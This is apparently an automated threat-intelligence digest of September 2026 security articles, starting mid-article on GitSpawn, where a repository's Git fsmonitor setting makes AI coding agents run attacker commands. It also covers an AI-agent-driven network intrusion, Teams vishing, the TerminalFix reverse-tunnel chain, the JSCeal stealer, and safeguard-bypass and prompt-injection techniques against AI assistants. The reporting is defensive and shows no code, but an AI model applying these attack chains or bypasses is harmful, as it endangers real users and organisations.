core.fsmonitor is a Git performance setting whose value is a command that Git runs to identify changed files, and Git reads it from the repository's own .git/config. Any operation that refreshes the index, including git status and git diff, executes that command. The agents call those commands in the background to determine which branch they are on and which files have changed, leaving the repository's configuration untouched. Manifold, which published the findings as GitSpawn , wrote up five of the eight in detail and said it found the pattern in more agents than it names. "The vulnerability is not in the model, or in anything new. It is in the ordinary plumbing underneath, the subprocess an agent spawns at session startup to work out where it is," Manifold said. The following agents and versions are affected - goose - All versions prior to 1.44.0, fixed in 1.44.0 Codex CLI - 0.102.0 through 0.130.0, fixed in 0.131.0 Codex Desktop for macOS - 260202.0859 through 26.513.31313, fixed in 26.519.22136 Codex Desktop for Windows - 26.304.38 through 26.513.40821, fixed in 26.519.21041, and Microsoft Store package 26.304.38.0 through 26.513.4821.0, fixed in 26.519.2081.0 Claude Code - Confirmed by Manifold on 2.1.193 and fixed by 2.1.196 on the core.fsmonitor path, with the claude ultrareview path confirmed live on 2.1.252 Hermes Agent - 0.18.2 and 0.21.0 confirmed by Manifold, fix pending Qwen Code - 0.19.6 and 0.22.3 confirmed by Manifold, fix pending Grok Build - 0.2.93 and 1.0.13 confirmed by Manifold, fix pending In goose, the goose review command builds its Git invocations with one configuration flag, -c core.quotePath=off, and strips nothing else. GitHub assigned CVE-2026-72718 a CVSS 4.0 base score of 7.0 in an advisory crediting Francisco Rosales , the only score any of these findings carries. "So running goose review inside a malicious repo runs attacker code - no submitted prompt, no model call, no tool approval, no trust prompt. The command executes before goose ever contacts the model," the advisory said. Sonar reported the same sink in April , noted that Anthropic had already moved the startup sequence once to close it, and identified the same trust-dialog bypass in Visual Studio Code before 1.63.1 ( CVE-2021-43891 ) and in JetBrains IDEs before 2021.3.1 ( CVE-2022-24346 ). "In version 2.0.34, Claude was updated in a way that mitigated the specific vulnerability by no lo
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code
  - Published: 2026-09-02T14:06:59+00:00
  - Link: https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html
  - Summary: Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication. The command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive

### Cluster c6e611856a — score 10

- Title: An AI-Assisted Cyber Attack: Inside a Unit 42 Investigation
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-02T10:00:46+00:00
- Link: https://unit42.paloaltonetworks.com/ai-assisted-cyber-attack-inside-a-unit-42-investigation/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- attack_techniques: T0000, T0002, T1046, T1190, T1552.001
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: zero_day
- attack_techniques: T0000, T0002, T1046, T1190, T1552.001
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Using autonomous AI agents, an attacker breached an enterprise network in a matter of hours. Understand how to address and defend against agentic attacks. The post An AI-Assisted Cyber Attack: Inside a Unit 42 Investigation appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Insights General General An AI-Assisted Cyber Attack: Inside a Unit 42 Investigation 4 min read Related Products Unit 42 Frontier AI Defense Unit 42 Incident Response By: Renzon Cruz Nicolas Bareil Eric Semaan Omar Jbari Published: September 2, 2026 Categories: General Insights Threat Research Tags: Agentic AI Frontier AI Share Unit 42 responded to an incident where a human attacker used frontier AI to breach an enterprise network autonomously as part of a ransom attack. The agents breached the company's security layers in a methodical manner, each targeting a different layer of defense to achieve a shared goal. The impact was at the scale of a coordinated effort from multiple red teams, which would normally take human operators around two weeks. The threat actor told us in negotiations that they leveraged frontier AI models and attack-specific agentic AI frameworks. By shifting execution to an automated loop, the attacker compressed weeks of methodical intrusion tradecraft (using more than 50 MITRE ATT&CK techniques) into less than 10 hours. After they gained initial access, the attacker used agents to map the internal architecture, raid source repositories and seize root credentials. The agents also triggered unauthorized continuous integration/continuous delivery (CI/CD) builds and claimed master keys to the victim's cloud AI infrastructure. What made the attack stand out was AI-assisted operational efficiency, without the need for a novel zero-day or super elite tradecraft. The attacker left tactical execution to AI agents that monitored, evaluated, acted and re-planned in real time, increasing speed throughout the attack chain. The attacker also directed the agent to leave behind a “report” on the organization’s security posture: an 80-page, technical audit detailing dozens of exploited findings. Inside the Machine-Speed Attack Chain The adversary ran their operation using current AI-enabled software development processes. We observed multiple indicators consistent with AI usage: LLM calls to multiple frontier AI agents in parallel Structured Markdown files passing information between agents and sessions Custom scripts (assessed with high confidence to be AI-generated due to UI elements) managing dynamic operations The 10-hour operational timeline included the following: Infiltration and mapping: The actor breached a public API endpoint to tunnel into the network, deploying an automated recon agent to map internal microservices. Secrets harvesting: Sub-agents combed enterprise code repositories, extracting hard-coded tokens and service passwords. Privilege takeover: Using exposed tokens, the actor infiltrated the secrets management system, harvesting master administrative credentials to seize control of root system access. Pipeline exploitation: The actor hijacked an enterprise code application via custom workflows to exfiltrate cloud access keys. They attempted to plant backdoors in Terraform configurations, but hard branch-protection controls stopped this. AI infrastructure hijacking: Using stolen cloud keys, the actor turned the victim’s AI endpoints into post-compromise infrastructure — using the company’s compute power to perpetrate future moves. Figure 1 maps the AI-orchestrated workflow. Figure 1. AI-orchestrated intrusion workflow. The actor sets objectives and makes consequential decisions. Specialized agents execute, share results and adapt in real time. Unified Threat Framework Mapping For illustration, Table 1 below maps some of the techniques used against the MITRE ATT&CK and ATLAS frameworks: Intrusion Stage Threat Actor Action MITRE ATT&CK ® Mapping MITRE ATLAS™ (AI-Specific) Mapping Initial Access and Recon API breach; automated service mapping via service discovery tool T1190: Exploit Public-Facing Application T1046: Network Service Discovery AML.T0000: Initial Access AML.T0002: AI-Automated Reconnaissance Credential Access Code scraping for secrets across code repos T1552.001: Cred
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: An AI-Assisted Cyber Attack: Inside a Unit 42 Investigation
  - Published: 2026-09-02T10:00:46+00:00
  - Link: https://unit42.paloaltonetworks.com/ai-assisted-cyber-attack-inside-a-unit-42-investigation/
  - Summary: Using autonomous AI agents, an attacker breached an enterprise network in a matter of hours. Understand how to address and defend against agentic attacks. The post An AI-Assisted Cyber Attack: Inside a Unit 42 Investigation appeared first on Unit 42 .

### Cluster eae1569c42 — score 10

- Title: Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams
- Source: Unit 42 (threat_research_primary)
- Published: 2026-08-31T10:00:36+00:00
- Link: https://unit42.paloaltonetworks.com/spring-ring-voice-phishing-campaigns/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- actor_attribution: APT29
- affected_products: Microsoft Entra, Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- actor_attribution: APT29
- affected_products: Palo Alto Networks, Microsoft Entra
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Learn how the Spring Ring campaign abuses Microsoft Teams and voice phishing to deploy malware and target enterprise domain controllers. The post Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams 13 min read Related Products Advanced DNS Security Advanced URL Filtering Cloud-Delivered Security Services Cortex Cortex XDR Cortex XSIAM Idira Unit 42 Incident Response By: Noam Sala Published: August 31, 2026 Categories: Malware Threat Research Tags: Cloaked Ursa Entra ID Microsoft Teams Payload PowerShell Remote Access Trojan Spoof Vishing Share Executive Summary Between January and April 2026, we uncovered a coordinated social engineering operation that leveraged external Microsoft Teams accounts to masquerade as IT help desk personnel. Our telemetry reveals that this operation targeted more than 150 employees across at least 10 companies in various industries. We call this activity Spring Ring. What seems like a benign chat is in fact a voice phishing (vishing) call, during which adversaries try to coerce victims into executing remote monitoring and management (RMM) tools or custom malware. In a more advanced variant, attackers transitioned from a vishing call to a full-blown Microsoft NT LAN Manager (NTLM) relay attack aimed at an organization's domain controller (DC). We provide a technical breakdown of this operation’s attack lifecycle across two observed campaigns, both illustrating vishing manipulation that resulted in the attempted payload delivery via two distinct attack vectors. These two campaigns demonstrate the weaponization of communication platforms as identity becomes a primary attack vector. Palo Alto Networks customers are better protected from the threats described here through the following products and services: Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM Cortex Advanced Email Security Cortex Cloud Identity Threat Detection Idira Threat Detection and Response (ITDR) Idira Endpoint Privileged Manager (EPM) Idira Privileged Access Management (PAM) Idira Secure Infrastructure Access (SIA) If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Phishing , Identity , Social Engineering Overview: The Trust Gap Spring Ring’s activity mirrors a broader trend in the threat landscape toward social engineering campaigns. According to our recently published Insights blog , threat actors have increasingly moved away from traditional phishing techniques toward trusted collaboration tools. In the first four months of 2026, phishing alerts from collaboration tools represented 42% of all phishing alerts in Cortex, up from 30% of all phishing alerts in the preceding four months. In addition, according to KnowBe4’s Phishing Threat Trends Report, Teams-based attacks rose by 41% [PDF] between October 2025 and March 2026. They note that this surge is driven by attackers exploiting the platform's default “ Chat with Anyone ” feature to initiate direct chats with users outside their organization. Previous Teams-based attacks, such as those by Cloaked Ursa (aka APT29 ), focused on credential harvesting and group chat-based social engineering. They often relied on malicious links or fake Entra ID tenants to appear legitimate. Spring Ring’s approach relies on active human voice interaction. In this way, attackers can evade detection without a software exploit. Instead, they rely on exploiting the trust that employees place in software as a service (SaaS) collaboration platforms. SaaS Applications: The New High-Value Target SaaS applications are essential for business operations, storing an organization’s most critical and sensitive data. Unlike email, where users are trained to look for external sender banners or suspicious links, communications platforms provide a closed loop that attackers exploit by: Leveraging platform trust: People are more likely to engage with a message from a help desk identity than a random email from an external domain Exploiting human interaction: A professional voic
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams
  - Published: 2026-08-31T10:00:36+00:00
  - Link: https://unit42.paloaltonetworks.com/spring-ring-voice-phishing-campaigns/
  - Summary: Learn how the Spring Ring campaign abuses Microsoft Teams and voice phishing to deploy malware and target enterprise domain controllers. The post Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams appeared first on Unit 42 .

### Cluster 7b22ad7709 — score 10

- Title: TerminalFix campaign deploys a reverse tunnel through multistage intrusion
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-08-29T03:43:27+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/08/28/terminalfix-campaign-deploys-reverse-tunnel-through-multistage-intrusion/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft Threat Intelligence provides analysis of a ClickFix campaign that uses fake CAPTCHA prompts, DLL sideloading, and a reverse tunnel, with detections and hunting guidance. The post TerminalFix campaign deploys a reverse tunnel through multistage intrusion appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags ClickFix Content types Research Products and services Microsoft Defender Topics Actionable threat insights Defending against advanced tactics Threat intelligence Microsoft Threat Intelligence has observed a TerminalFix campaign, a variant of ClickFix, targeting organizations across multiple industries. The campaign uses compromised websites to display a fake Cloudflare CAPTCHA verification overlay that tricks users into copying and executing a malicious PowerShell command. While traditional ClickFix campaigns direct victims to the Windows Run dialog, TerminalFix campaigns apply the same technique but direct users to Windows Terminal or PowerShell instead, increasing the likelihood that complex, multi-line scripts execute successfully. Unlike earlier ClickFix variants that typically deliver a single infostealer, this TerminalFix campaign deploys a sophisticated multi-stage attack chain that combines DLL sideloading, steganographic payload extraction, extensive Active Directory reconnaissance, and a custom reverse-tunnel implant – giving the attacker persistent, network-level proxy access through the compromised host. Once executed, the PowerShell command masquerades as a Cloudflare verification process while downloading a ZIP archive containing a legitimate binary ( LockScreenContentServer.exe ) and a malicious DLL ( dui70.dll ) used for sideloading. The sideloaded DLL drives an elaborate second stage: downloading payloads concealed inside PNG images using steganography, establishing dual persistence through Registry Run keys and scheduled tasks, conducting thorough domain reconnaissance—including domain trust enumeration, domain admin discovery, Active Directory user description harvesting, and targeted server ping sweeps—and ultimately deploying a Python-based reverse-tunnel C2 implant that tunnels arbitrary TCP traffic back through an encrypted WebSocket channel to attacker infrastructure. This type of intrusion is particularly dangerous because it provides attackers with direct access to an organization’s internal network through the reverse tunnel. The observed reconnaissance and reverse-tunnel capability could enable an attacker to identify and reach additional systems from a compromised host. Microsoft did not observe the downstream actions described below in the analyzed chain. Organizations should treat affected devices as potential network pivot points and investigate for lateral movement and credential exposure. In the hands-on-keyboard phase that typically follows, attackers leverage this access to escalate privileges, disable security controls, exfiltrate sensitive data, and deploy ransomware across the organization. The combination of stealth techniques (DLL sideloading, steganography, hidden folders) and persistent network access make this TerminalFix campaign a serious threat to enterprise environments. In this blog, we share our detailed analysis of the TerminalFix attack chain – from initial compromise through network tunneling—along with indicators of compromise, detection details, and hunting guidance to help defenders identify and respond to this threat. Attack chain overview The TerminalFix campaign follows a multi-stage attack chain that progresses from social engineering through payload delivery, persistence, reconnaissance, and ultimately network tunneling: 1. Initial access via compromised website – A compromised website displays a fake Cloudflare Turnstile CAPTCHA verification overlay. The user is instructed to copy and paste a “verification” command. 2. PowerShell execution – The pasted command runs a disguised PowerShell script that downloads a ZIP archive from attacker infrastructure, extracts it to C:\ProgramData , and silently launches a batch file. 3. DLL sideloading — The batch file executes LockScreenContentServer.exe , a signed legitimate binary, which automatically loads the co-located malicious dui70.dll . 4. Steganographic payload retrieval – The sidelo
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: TerminalFix campaign deploys a reverse tunnel through multistage intrusion
  - Published: 2026-08-29T03:43:27+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/08/28/terminalfix-campaign-deploys-reverse-tunnel-through-multistage-intrusion/
  - Summary: Microsoft Threat Intelligence provides analysis of a ClickFix campaign that uses fake CAPTCHA prompts, DLL sideloading, and a reverse tunnel, with detections and hunting guidance. The post TerminalFix campaign deploys a reverse tunnel through multistage intrusion appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: TerminalFix campaign deploys a reverse tunnel through multistage intrusion
  - Published: 2026-08-29T03:43:27+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/08/28/terminalfix-campaign-deploys-reverse-tunnel-through-multistage-intrusion/
  - Summary: Microsoft Threat Intelligence provides analysis of a ClickFix campaign that uses fake CAPTCHA prompts, DLL sideloading, and a reverse tunnel, with detections and hunting guidance. The post TerminalFix campaign deploys a reverse tunnel through multistage intrusion appeared first on Microsoft Security Blog .

### Cluster bbea7197be — score 10

- Title: Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon
- Source: Check Point Research (threat_research_primary)
- Published: 2026-09-02T10:16:16+00:00
- Link: https://research.checkpoint.com/2026/gaming-the-system-how-a-chinese-speaking-actor-turned-brazilian-government-sites-into-an-seo-weapon/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, ransomware_extortion
- affected_industries: critical_infrastructure, financial_services, government
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng
- affected_industries: financial_services, government, critical_infrastructure
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Research by: Amit Yardeni Key Points Introduction Since mid-2025, Check Point Research has tracked a sustained campaign against Brazilian organizations. The tradecraft points to a Chinese-speaking cybercrime group connected to Earth Berberoka, an actor first documented targeting gambling sites across Asia. Once inside a victim, the group deploys a broad Linux toolkit: a custom downloader, several backdoors, […] The post Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 19 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 470 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 423 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon September 2, 2026 https://research.checkpoint.com/2026/gaming-the-system-how-a-chinese-speaking-actor-turned-brazilian-government-sites-into-an-seo-weapon/ Research by: Amit Yardeni Key Points A Chinese-speaking actor is now targeting Brazil. Check Point Research has uncovered a sustained campaign against Brazilian organizations, primarily government and educational institutions since mid-2025. We dubbed this group Gambling Goblin: a Chinese-speaking cybercrime cluster connected to a previously documented group, Earth Berberoka, that targeted gambling sites across Asia. It marks a shift from Brazil’s usual home-grown banking-trojan threats to a foreign operator moving in Compromised web servers turned into stealthy proxies. The attackers compile and install malicious Apache modules on victim servers that silently reverse-proxy visitors to attacker-controlled phishing pages, while the traffic still appears to originate from the legitimate domain, with the site’s own security headers stripped so injected content runs freely. Large-scale SEO manipulation. The phishing pages pose as trusted app stores such as Google Play, Microsoft Store, and Amazon. Behind that facade, they push online gambling and sports betting, and they chain together compromised high-reputation domains, many of them Brazilian government sites, to inflate search rankings and hijack traffic at scale. A broad, heavily obfuscated Linux toolkit. Once inside a host, the group deploys custom tools – downloader ( DownPro ), multiple backdoors including the modular AlphaAgent and the oRAT RAT, a 3snake-based credential stealer, an SSH brute-forcer, and a plugin-driven reconnaissance agent. Most of them are wrapped in packing and virtualization layers to slow analysis and evade detection. The operation reaches well beyond Brazil. We identified parallel phishing networks localized in Vietnamese, Spanish, and English, alongside infrastructure that generates fresh domains daily – evidence the model is built to scale and be exported to new regions. One step from direct malware delivery. Because the pages already mimic app-download destinations, the same infrastructure sits a single configuration change away from pushing malware straight to victims, a latent escalation risk beyond the current search-fraud scheme. Introduction Since mid-2025, Check Point Research has tracked a sustained campaign against Brazilian organizations. The tradecraft points to a Chinese-speaking cybercrime group connected to Earth Berberoka, an actor first documented targeting gambling sites across Asia. Once inside a victim, the group deploys a broad Linux toolkit: a custom downloader, several backdoors, and familiar offensive utilities. Most of it arrives heavily obfuscated – wrapped in layered virtualization and packing to slow analysis and evade detection. The purpose becomes clear at the network layer. The attackers install custom Apache modules that quietly proxy visitors to a sprawling set of phishing pages. Many of those pages sit on Brazilian government domains that appear to have been compromised and repurposed without their owners’ knowledge. The reach extends beyond Brazil. We uncovered a second phishing network run by the same actor; this one is built for Vietnamese victims. The likely goal is SEO manipulation at scale. By hijacking trusted, high-reputation domains, many of them Brazilian government sites, the operators borrow that reputation to push their own content up the search rankings and hijack the t
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon
  - Published: 2026-09-02T10:16:16+00:00
  - Link: https://research.checkpoint.com/2026/gaming-the-system-how-a-chinese-speaking-actor-turned-brazilian-government-sites-into-an-seo-weapon/
  - Summary: Research by: Amit Yardeni Key Points Introduction Since mid-2025, Check Point Research has tracked a sustained campaign against Brazilian organizations. The tradecraft points to a Chinese-speaking cybercrime group connected to Earth Berberoka, an actor first documented targeting gambling sites across Asia. Once inside a victim, the group deploys a broad Linux toolkit: a custom downloader, several backdoors, […] The post Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon appeared first on Check Point Research .

### Cluster 96362ad42a — score 10

- Title: Breaking the Seal: Static Deobfuscation of JSCeal’s Compiled V8 Bytecode
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-31T13:38:28+00:00
- Link: https://research.checkpoint.com/2026/breaking-the-seal-static-deobfuscation-of-jsceals-compiled-v8-bytecode/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, ransomware_extortion
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Research by: hasherezade Key Points Introduction JSCeal is a stealer delivered as compiled V8 bytecode (.jsc) and executed by a bundled Node.js runtime, targeting cryptocurrency applications (other vendors also tag it with the names WEEVILPROXY or MeadowLocust). Its campaign activity dates back to March 2024 [1]; Check Point Research has been tracking the malware since early […] The post Breaking the Seal: Static Deobfuscation of JSCeal’s Compiled V8 Bytecode appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 19 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 470 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 423 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Breaking the Seal: Static Deobfuscation of JSCeal’s Compiled V8 Bytecode August 31, 2026 https://research.checkpoint.com/2026/breaking-the-seal-static-deobfuscation-of-jsceals-compiled-v8-bytecode/ Research by: hasherezade Key Points Since early 2025, Check Point Research has been tracking JSCeal, a sophisticated cryptocurrency-focused stealer with broader credential-theft, surveillance, and traffic-interception capabilities, delivered as compiled V8 bytecode (JSC files). The payloads are protected with javascript-obfuscator , using multiple techniques including RC4-protected strings, control-flow flattening, proxy functions, and operation wrappers. Our goal was to recover the code to a level that enables detailed analysis, comparison between samples, and tracking of the malware’s evolution. CPR developed a fully static deobfuscation pipeline that transforms View8 pseudocode without executing the malware. An optional LLM-assisted renaming stage can then be used to make large, recovered codebases easier to navigate. The complete toolkit is publicly available at jsc_deobfuscator . The deobfuscated output enabled detailed analysis of JSCeal’s capabilities and their implementation, including keylogging, browser and credential theft, and HTTPS traffic interception through a local MITM proxy. We presented this research at Black Hat USA 2026 . This article complements the talk by documenting the methodology in greater technical depth and providing additional examples and implementation details. We conclude with a brief look at more recent JSCeal developments, including V8 code caches generated for a newer Node.js/V8 version, an additional payload-encryption layer, and macOS targeting. Introduction JSCeal is a stealer delivered as compiled V8 bytecode ( .jsc ) and executed by a bundled Node.js runtime, targeting cryptocurrency applications (other vendors also tag it with the names WEEVILPROXY or MeadowLocust). Its campaign activity dates back to March 2024 [ 1 ]; Check Point Research has been tracking the malware since early 2025. Our previous publication from July 2025 [ 1 ] focused on the campaigns, delivery chain, and targeting. In this article, we focus on the analysis problem hidden inside the final payload. Unlike ordinary JavaScript malware, JSCeal reaches the analyst after two transformations have already removed much of the information that source-oriented tools depend on. First, the JavaScript is heavily obfuscated. Then it is compiled into V8’s internal bytecode representation and shipped as cached data rather than source code. The resulting format is version-specific, poorly served by mature reverse-engineering tooling, and unsuitable for most standard JavaScript deobfuscation workflows. From the attacker’s perspective, this combination is attractive because it is inexpensive to produce. Node.js and its package ecosystem provide ready-made building blocks for complex applications, while public tools such as javascript-obfuscator [ 6 ] can add several layers of source-level obfuscation before compilation. The analyst receives only the compiled artifact. In 2024, our colleague Moshe Marelus published View8 , an open-source decompiler for V8 bytecode [ 2 ]. We used it as the foundation for a static deobfuscation pipeline tailored to the patterns found in JSCeal. During this work, we extended View8 [ 3 ] to make its output reproducible and suitable for automated post-processing, and implemented dedicated passes for value propagation, string reconstruction, control-flow unflattening, proxy and operation-wrapper resolution, and additional cleanup.
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: Breaking the Seal: Static Deobfuscation of JSCeal’s Compiled V8 Bytecode
  - Published: 2026-08-31T13:38:28+00:00
  - Link: https://research.checkpoint.com/2026/breaking-the-seal-static-deobfuscation-of-jsceals-compiled-v8-bytecode/
  - Summary: Research by: hasherezade Key Points Introduction JSCeal is a stealer delivered as compiled V8 bytecode (.jsc) and executed by a bundled Node.js runtime, targeting cryptocurrency applications (other vendors also tag it with the names WEEVILPROXY or MeadowLocust). Its campaign activity dates back to March 2024 [1]; Check Point Research has been tracking the malware since early […] The post Breaking the Seal: Static Deobfuscation of JSCeal’s Compiled V8 Bytecode appeared first on Check Point Research .

### Cluster e57f34f6e2 — score 10

- Title: 31th August – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-31T12:58:42+00:00
- Link: https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ai_security, data_breach, phishing_social_eng, ransomware_extortion
- actor_attribution: ShinyHunters
- affected_industries: healthcare
- affected_products: Okta, Salesforce, Ubiquiti UniFi
- cve_ids: CVE-2026-75604, CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach, ai_security, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: healthcare
- affected_products: Salesforce, Okta, Ubiquiti UniFi
- cve_ids: CVE-2026-81578, CVE-2026-82078, CVE-2026-75604
- urgency_signals: actively_exploited, preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 31st August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Manchester Airports Group, the UK operator of Manchester, London Stansted, and East Midlands airports, has disclosed a cyberattack that exposed data belonging to about 8.7 million customers. The compromised information includes contact details, […] The post 31th August – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 31th August – Threat Intelligence Report August 31, 2026 https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 31st August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Manchester Airports Group, the UK operator of Manchester, London Stansted, and East Midlands airports, has disclosed a cyberattack that exposed data belonging to about 8.7 million customers. The compromised information includes contact details, vehicle registration numbers, and information collected through car park, lounge, fast-track, and Wi-Fi registrations. The U.S. Bureau of Alcohol, Tobacco, Firearms and Explosives has confirmed a cyberattack affecting a standalone computer containing information on ATF investigation targets. The system was disconnected after the compromise, while the Qilin ransomware group listed the agency on its leak site and claimed responsibility. Boston Scientific, a US-based global medical device company, has experienced a cyberattack that caused network outages and disrupted operations worldwide. Access to internal systems and applications, including services supporting order processing and shipping, was affected. The company began restoring impacted systems following the August 26 disruption. McKesson, a major U.S. healthcare and pharmaceutical company, has disclosed a data breach involving unauthorized access to third-party applications and data theft. Threat group ShinyHunters claimed it used vishing to compromise Okta accounts and access Salesforce and Snowflake, exfiltrating about 1TB of data containing approximately 284 million patient-related records. AI THREATS Researchers described Cryptographic Context Injection, a technique that conceals malicious instructions inside encrypted content to bypass safeguards in AI assistants with browsing and code capabilities. During testing, Grok was induced to expose user conversation data while Gemini generated content that would normally be blocked by its safety controls. Researchers detailed a prompt injection vulnerability in Amazon Kiro, an AI development environment, that could allow malicious workspace files to manipulate the agent and transmit local information. Exploitation required a user to open a crafted project and interact with Kiro. Amazon addressed the issue in version 0.8.140. Researchers profiled AnonyMousKIT, an AI-enabled phishing-as-a-service operation targeting owners of stolen iPhones. The platform uses email, text messages, WhatsApp, and AI-generated voice calls to steal Apple IDs, passcodes, and two-factor authentication codes, helping criminals remove Activation Lock and gain access to associated accounts. VULNERABILITIES AND PATCHES PaperCut released emergency fixes for two actively exploited vulnerabilities affecting PaperCut NG and MF. CVE-2026-81578, rated CVSS 8.8, enables authentication bypass, while CVE-2026-82078, rated CVSS 9.4, involves unsafe class loading. Attackers can chain the vulnerabilities to achieve unauthenticated remote code execution on affected servers. Ubiquiti patched 21 critical and high-severity vulnerabilities affecting UniFi Protect, Network, Access, Talk, UniFi OS, and other products. The flaws include authentication bypass, command injection, and privilege escalation issues, with several receiving CVSS scores of 10.0. Successful exploitation could allow attackers to gain administrative control over affected devices. Vercel addressed two critical vulnerabilities affecting Next.js, including CVE-2026-75604, a Windows-specific path traversal flaw, and a libheif AVIF image-processing vulnerability. Both can result in unauthenticated remote code execution under affected configurations. Fixes are included in Next.js versions 15.5.24 and 16.3.3. A public proof-of-concept is available for the AVIF issue. ServiceNow has addressed three critical vulnerabilitie
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 31th August – Threat Intelligence Report
  - Published: 2026-08-31T12:58:42+00:00
  - Link: https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 31st August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Manchester Airports Group, the UK operator of Manchester, London Stansted, and East Midlands airports, has disclosed a cyberattack that exposed data belonging to about 8.7 million customers. The compromised information includes contact details, […] The post 31th August – Threat Intelligence Report appeared first on Check Point Research .

